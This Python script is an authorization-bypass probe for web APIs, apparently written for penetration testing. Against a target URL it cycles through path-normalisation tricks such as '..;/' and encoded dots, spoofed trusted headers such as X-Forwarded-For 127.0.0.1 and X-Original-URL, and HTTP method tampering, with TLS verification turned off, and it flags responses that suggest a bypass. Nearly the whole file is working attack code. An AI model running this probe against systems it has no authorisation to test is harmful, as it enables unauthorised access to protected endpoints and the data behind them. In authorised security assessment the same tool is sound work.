#!/usr/bin/env python3
"""authz_bypass_matrix.py — probe a hard 401/403 wall for a bypass.

Use when an endpoint answers 401/403 uniformly and you suspect the *filter* is
path- or header-based rather than a real authorization check.

    python3 authz_bypass_matrix.py https://api.target.com /api/
    python3 authz_bypass_matrix.py https://api.target.com /api/users -H "Cookie: s=..."

Reports a table of (variant, status, size, body-prefix) and then a verdict block:
- any 2xx/30x that the baseline did not produce  -> POSSIBLE BYPASS (inspect)
- only 401/403/404                               -> filter is consistent; not a bypass
- 5xx cluster on ';' / '..' forms                -> path-parser differential (Tomcat/Nginx
                                                    normalisation), still not a bypass, but note it

Exit code 0 always; this is an evidence generator, not a gate.
"""
import argparse
import sys

import requests

requests.packages.urllib3.disable_warnings()
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

# Path forms that defeat prefix-based filters. `{p}` is the protected path.
PATH_VARIANTS = [
    "{p}", "//{p}", "{p}//", "{p}/./", "{p}/../{p}", "{p}/%2e/", "{p}/%2e%2e{p}",
    "{p}/..;/", "{p};/", "/;{p}", "{p}/%2f", "{p}/.", "{p}/%00", "{p}/static/../",
    "/./{p}", "/%61pi/", "{p}/%61", "{p}%20", "{p}?", "{p}#",
    "{p}".replace("/", "/%2F"), "{p}..;/", "{p}/;/",
]

HEADER_VARIANTS = [
    ("baseline", {}),
    ("x-forwarded-for-local", {"X-Forwarded-For": "127.0.0.1"}),
    ("x-forwarded-for-chain", {"X-Forwarded-For": "10.0.0.1, 127.0.0.1"}),
    ("x-real-ip", {"X-Real-IP": "127.0.0.1"}),
    ("x-client-ip", {"X-Client-IP": "127.0.0.1"}),
    ("x-originating-ip", {"X-Originating-IP": "127.0.0.1"}),
    ("x-original-url", {"X-Original-URL": "{p}"}),
    ("x-rewrite-url", {"X-Rewrite-URL": "{p}"}),
    ("x-forwarded-host", {"X-Forwarded-Host": "localhost"}),
    ("x-forwarded-proto", {"X-Forwarded-Proto": "https"}),
    ("x-http-method-override", {"X-HTTP-Method-Override": "GET"}),
]

METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]


def probe(session, method, url, extra_headers, cookie):
    h = {"User-Agent": UA, "Accept": "application/json, text/html;q=0.9,*/*;q=0.8"}
    h.update(extra_headers)
    if cookie:
        h["Cookie"] = cookie
    try:
        r = session.request(method, url, headers=h, timeout=10, verify=False,
                            allow_redirects=False)
        body = (r.text or "").replace("\n", " ")[:70]
        return r.status_code, len(r.content or b""), body, r.headers.get("Allow", "")
    except Exception as e:
        return "ERR", 0, str(e)[:60], ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base", help="https://host[:port]")
    ap.add_argument("path", nargs="?", default="/api/", help="protected path (default /api/)")
    ap.add_argument("-H", "--header", default="", help="extra header, e.g. 'Cookie: a=b'")
    args = ap.parse_args()

    base = args.base.rstrip("/")
    p = args.path if args.path.startswith("/") else "/" + args.path
    cookie = ""
    if args.header.lower().startswith("cookie:"):
        cookie = args.header.split(":", 1)[1].strip()

    s = requests.Session()
    rows = []

    print("=" * 78)
    print(f"A) path normalisation  ({base}{p})")
    baseline = probe(s, "GET", base + p, {}, cookie)
    print(f"  {'baseline':22s} {baseline[0]} {baseline[1]:>7} {baseline[2][:60]}")
    for tpl in PATH_VARIANTS:
        path = tpl.format(p=p.rstrip("/"))
        st, ln, body, _ = probe(s, "GET", base + path, {}, cookie)
        flag = ""
        if isinstance(st, int) and st not in (401, 403, 404, 405) and st != baseline[0]:
            flag = "  <== INTERESTING"
        print(f"  {path:22s} {st} {ln:>7} {body[:60]}{flag}")
        rows.append((f"path:{path}", st))

    print("=" * 78)
    print("B) trusted-header bypass")
    for name, hdrs in HEADER_VARIANTS:
        h = {k: v.format(p=p) for k, v in hdrs.items()}
        st, ln, body, _ = probe(s, "GET", base + p, h, cookie)
        flag = "  <== INTERESTING" if st != baseline[0] and st not in (401, 403) else ""
        print(f"  {name:24s} {st} {ln:>7} {body[:55]}{flag}")
        rows.append((f"hdr:{name}", st))

    print("=" * 78)
    print("C) method tampering")
    for m in METHODS:
        st, ln, body, allow = probe(s, m, base + p, {}, cookie)
        print(f"  {m:8s} {st} {ln:>7} allow={allow[:40]} {body[:40]}")
        rows.append((f"method:{m}", st))

    print("=" * 78)
    interesting = [r for r, st in rows
                   if isinstance(st, int) and st not in (401, 403, 404, 405)]
    if interesting:
        print("POSSIBLE BYPASS — inspect these first:")
        for r in interesting:
            print("  ", r)
    else:
        print("VERDICT: no bypass in this matrix. The 401/403 is consistent across path,")
        print("header and method variants -> the check is real authorization, not a")
        print("prefix filter. Record it as a deliberate negative (with this table) and")
        print("move on; note any 5xx on ';'/..;/ forms separately as a parser differential.")
    print("\nReminder: a 5xx is NOT a bypass. Tomcat/Nginx path-parser disagreements")
    print("produce 500s on '..;/' and ';/' forms while still refusing the request.")


if __name__ == "__main__":
    main()
